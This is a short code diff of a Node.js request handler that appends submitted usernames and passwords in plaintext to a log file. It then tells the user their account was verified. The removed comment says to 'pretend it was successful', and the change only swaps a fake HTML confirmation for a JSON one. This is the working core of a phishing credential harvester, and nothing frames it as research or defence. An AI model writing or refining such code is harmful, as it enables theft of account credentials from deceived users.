@@ -15,6 +15,6 @@ module.exports = async (req, res) => {
     const logEntry = `Username: ${username}, Password: ${password}\n`;
     fs.appendFileSync(filePath, logEntry);
 
-    // Respond to the user (pretend it was successful)
-    res.send('<h2>Verification Complete</h2><p>Your account has been verified successfully.</p>');
+    // Respond with a JSON success message
+    res.json({ message: 'Account verified' });
 };
